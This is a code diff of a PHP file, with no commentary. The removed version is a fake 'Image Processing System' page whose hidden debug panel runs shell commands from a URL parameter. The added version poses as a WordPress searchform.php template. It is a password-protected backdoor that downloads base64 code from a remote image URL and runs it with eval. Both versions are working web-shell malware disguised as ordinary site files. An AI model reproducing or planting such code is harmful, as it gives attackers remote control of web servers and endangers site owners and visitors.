@@ -1,91 +1,66 @@
 <?php
-// JPEG Header + PHP code
-$jpeg_header = "\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01";
-$php_code = '/*' . str_repeat(' ', 1024) . '*/ ?>';
-
-// Check if we're being accessed as JPEG or PHP
-if(isset($_GET['view']) && $_GET['view'] == 'image') {
-    header('Content-Type: image/jpeg');
-    echo $jpeg_header;
-    echo base64_decode('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCdABmX/9k=');
-    exit;
+error_reporting(0);
+if (isset($_REQUEST["0kb"])) {
+    die(">0kb<");
 }
 
-// Normal PHP execution
-header('Content-Type: text/html; charset=utf-8');
+if (function_exists('session_start')) {
+    session_start();
+    if (!isset($_SESSION['secretyt'])) {
+        $_SESSION['secretyt'] = false;
+    }
+    if (!$_SESSION['secretyt']) {
+        if (isset($_POST['pwdyt']) && hash('sha256', $_POST['pwdyt']) === '64d362d2e483e8023c46595f83ca8d9555ff6d7cc700a2474fbdbd341c43c1fb') {
+            $_SESSION['secretyt'] = true;
+        } else {
+            die('
+                <html> 
+                <head> 
+                    <meta charset="utf-8"> 
+                    <title></title> 
+                    <style type="text/css"> 
+                        body { padding:10px } 
+                        input { padding: 2px; display:inline-block; margin-right: 5px; } 
+                    </style> 
+                </head> 
+                <body> 
+                    <form action="" method="post" accept-charset="utf-8"> 
+                        <input type="password" name="pwdyt" value="" placeholder="passwd"> 
+                        <input type="submit" name="submit" value="submit"> 
+                    </form> 
+                </body> 
+                </html>
+            ');
+        }
+    }
+}
+
+/*
+ * The searchform.php template.
+ *
+ * Used any time that get_search_form() is called.
+ *
+ * @link https://wordpress.org/themes/template/
+ * @package WordPress
+ * @subpackage
+ * @since 1.0 
+ */
+
+$l = "https://user-images.githubusercontent.com/143735067/264713238-ae810af4-c98d-421f-bbb3-1ddcc58f952a.jpg" /* "" - ni*/;
+
+// DX for each form and a string
+if (function_exists('curl_init')) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $l);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_HEADER, false);
+    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");
+    $body = curl_exec($ch);
+    curl_close($ch);
+} else {
+    $body = @file_get_contents($l);
+}
+eval(base64_decode($body));
 ?>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Image Preview</title>
-    <style>
-        body {
-            background: #000;
-            color: #0f0;
-            font-family: monospace;
-            padding: 20px;
-        }
-        .image-container {
-            border: 1px solid #0f0;
-            padding: 10px;
-            margin: 20px 0;
-        }
-        img {
-            max-width: 300px;
-            border: 1px solid #333;
-        }
-        .debug {
-            background: #111;
-            padding: 10px;
-            margin-top: 20px;
-            border: 1px dashed #0f0;
-            font-size: 12px;
-        }
-    </style>
-</head>
-<body>
-    <h1>🖼️ Image Processing System</h1>
-    
-    <div class="image-container">
-        <img src="?view=image" alt="System Image">
-        <p>Image ID: <?php echo md5(time()); ?></p>
-    </div>
-    
-    <div class="debug">
-        <strong>System Info:</strong><br>
-        Server: <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
-        PHP: <?php echo PHP_VERSION; ?><br>
-        Time: <?php echo date('Y-m-d H:i:s'); ?>
-        
-        <?php
-        // Hidden admin panel
-        if(isset($_REQUEST['_'])) {
-            echo '<div style="background:#222;padding:10px;margin-top:10px;">';
-            echo '<strong>Debug Mode Activated</strong><br>';
-            
-            if(isset($_GET['exec'])) {
-                echo '<pre>';
-                system($_GET['exec']);
-                echo '</pre>';
-            }
-            
-            if(isset($_POST['data'])) {
-                file_put_contents('temp.dat', $_POST['data']);
-                echo 'Data saved.<br>';
-            }
-            
-            echo '</div>';
-        }
-        ?>
-    </div>
-    
-    <script>
-        // Add debug parameter on Ctrl+Shift+D
-        document.addEventListener('keydown', function(e) {
-            if(e.ctrlKey && e.shiftKey && e.key === 'D') {
-                window.location.href = window.location.href + (window.location.href.indexOf('?') > -1 ? '&' : '?') + '_=1';
-            }
-        });
-    </script>
-</body>
-</html>
